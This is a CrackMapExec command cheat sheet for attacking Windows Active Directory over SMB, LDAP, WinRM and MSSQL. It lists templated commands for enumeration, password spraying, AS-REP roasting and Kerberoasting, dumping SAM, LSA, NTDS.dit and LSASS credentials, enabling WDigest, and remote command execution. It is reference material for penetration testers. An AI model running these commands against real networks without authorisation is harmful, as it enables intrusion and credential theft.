# CrackMapExec (CME)

% cme, crackmapexec, windows, Active directory

## CME - Enumerate Hosts/Network (SMB)
Enumerates live hosts and basic information on an SMB network.
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
Example : cme smb 192.168.1.0/24

https://mpgn.gitbook.io/crackmapexec/

```bash
cme smb <ip_range>
```

## CME - Enumerate Password Policy (SMB)
Enumerates the password policy of the target domain.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
cme smb <ip> -u <user> -p '<password>' --pass-pol
```

## CME - Enumerate Null Session (SMB)
Attempts to establish a null session to enumerate shares and other information.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <ip> -u '' -p ''
```

## CME - Enumerate Anonymous Login (SMB)
Attempts an anonymous login to enumerate accessible resources.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <ip> -u 'a' -p ''
```

## CME - Enumerate Active Sessions (SMB)
Enumerates active sessions on the target.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --sessions
```

## CME - Enumerate Domain Users (SMB)
Enumerates domain users.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --users
```

## CME - Enumerate Users by RID Brute-force (SMB)
Enumerates users by brute-forcing Relative Identifiers (RIDs).
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --rid-brute
```

## CME - Enumerate Domain Groups (SMB)
Enumerates domain groups.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --groups
```

## CME - Enumerate Local Groups (SMB)
Enumerates local groups on the target.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --local-groups
```

## CME - Enumerate Shares (SMB)
Enumerates permissions on all shares.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --shares
```

## CME - Enumerate Disks (SMB)
Enumerates disks on the remote target.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --disks
```

## CME - Enumerate SMB Targets Without Signing (SMB)
Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing. List format is one IP per line.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
cme smb <ip> --gen-relay-list smb_targets.txt
```

## CME - Enumerate Logged-on Users (SMB)
Enumerates users currently logged on to the target.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --loggedon-users
```

## CME - Enable WDigest (SMB)
Enables/disables the WDigest provider to dump clear-text credentials from LSA memory.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 

```bash
cme smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
```

## CME - Logoff User (SMB)
Can be useful after enabling WDigest to force a user to reconnect.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

```bash
cme smb <ip> -u <user> -p '<password>' -x 'quser'
cme smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
```

## CME - Local Authentication (SMB)
Authenticates using local credentials.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <ip> -u <user> -p <password> --local-auth
```

## CME - Local Authentication with Hash (SMB)
Authenticates using a local NTLM hash.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

```bash
cme smb <ip> -u <user> -H <hash> --local-auth
```

## CME - Domain Authentication (SMB)
Authenticates using domain credentials.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <ip> -u <user> -p <password> -d <domain>
```

## CME - Kerberos Authentication (SMB)
Authenticates using Kerberos (requires KRB5CCNAME environment variable set).
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

Previously import ticket : 
export KRB5CCNAME=/tmp/ticket.ccache

```bash
cme smb <ip> --kerberos
```

## CME - Dump SAM Hashes (SMB)
Dumps SAM hashes using methods from secretsdump.py. Requires local admin privileges.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --sam
```

## CME - Dump LSA Secrets (SMB)
Dumps LSA secrets using methods from secretsdump.py. Requires Domain Admin or Local Admin Privileges on target Domain Controller.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --lsa
```

## CME - Dump NTDS.dit (SMB)
Dumps the NTDS.dit from target DC using methods from secretsdump.py. Requires Domain Admin or Local Admin Privileges on target Domain Controller.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --ntds
```

## CME - Dump LSASS (SMB)
Dumps LSASS memory using the lsassy module.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> -u <user> -p <password> -d <domain> -M lsassy
```

## CME - Dump LSASS with BloodHound Update (SMB)
Dumps LSASS memory and updates BloodHound with the collected data.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## CME - Password Spray (User=Password) (SMB)
Performs a password spray attack where the username is used as the password.
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
```

## CME - Password Spray (Multiple Tests) (SMB)
Performs a password spray attack with multiple password attempts per user (careful on lockout).
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
```

## CME - Put File (SMB)
Sends a local file to the remote target.
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 

```bash
cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```


## CME - Get File (SMB)
Retrieves a file from the remote target.
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 

```bash
cme smb <ip> -u <user> -p <password> --get-file <remote_path|\Windows\Temp\target.txt> <local_file>
```


## CME - AS-REP Roasting (LDAP, No Auth)
Performs AS-REP Roasting against an LDAP server without authentication.
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

User can be a wordlist too (user.txt)
Hashcat format  -m 18200 

```bash
cme ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## CME - AS-REP Roasting (LDAP, With Auth)
Performs AS-REP Roasting against an LDAP server with authentication.
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON  

Hashcat format  -m 18200 

```bash
cme ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## CME - Kerberoasting (LDAP)
Performs Kerberoasting against an LDAP server.
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

Hashcat format  -m 13100

```bash
cme ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
```

## CME - Unconstrained Delegation (LDAP)
Lists all computers and users with the TRUSTED_FOR_DELEGATION flag.
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

```bash
cme ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```

## CME - WinRM Authentication
Authenticates to a WinRM service.
#plateform/linux #target/remote #port/5985 #port/5986 #protocol/winrm #cat/ATTACK/CONNECT  

```bash
cme winrm <ip> -u <user> -p <password>
```

## CME - MSSQL Password Spray
Performs a password spray attack against an MSSQL server.
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/BRUTEFORCE-SPRAY  

```bash
cme mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
```

## CME - MSSQL Execute Query
Executes a SQL query on the MSSQL server.
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## CME - MSSQL Execute Command
Executes an operating system command on the MSSQL server.
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
```

= ip: 192.168.1.0/24
